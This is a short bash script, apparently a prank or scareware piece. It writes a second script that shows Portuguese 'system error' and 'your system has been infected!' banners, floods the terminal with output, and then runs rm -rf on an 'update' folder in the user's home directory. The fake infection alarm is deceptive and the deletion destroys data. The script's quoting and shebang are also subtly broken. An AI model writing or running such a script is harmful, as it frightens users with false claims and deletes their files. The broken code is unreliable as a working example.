local=`echo $PWD | rev | cut -d'/' -f 1 | rev`
echo "#bin/bash" > ~/$local/term.sh
echo '
local=`echo $PWD | rev | cut -d'/' -f 1 | rev`
um='1'
p=1
tput setaf 1 ;tput bold; figlet 'erro no sistema'
figlet 'seu sistema foi infectado!'
sleep 10
while [ 2000 -gt $p ];do
 um=$um"10"
   echo $um
   p=$((p+1))
 done
rm -rf ~/$local/update
' >> ~/$local/term.sh

